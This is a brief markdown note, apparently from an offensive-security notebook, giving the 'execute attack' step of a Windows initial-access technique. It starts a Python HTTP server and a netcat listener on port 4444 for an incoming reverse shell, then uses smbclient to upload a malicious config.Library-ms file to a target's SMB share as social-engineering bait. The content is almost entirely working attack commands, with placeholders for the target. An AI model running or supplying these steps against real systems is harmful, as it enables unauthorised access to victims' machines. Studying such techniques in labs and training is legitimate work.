---
tags:
  - Foundational
  - Initial_Access
  - Social_Engineering
  - Windows
---

### Execute Attack

#### Start Listeners
```bash
python3 -m http.server 8000
nc -nvlp 4444
```

#### Deliver Library File
```bash
smbclient //<Target>/share -c 'put config.Library-ms'
```
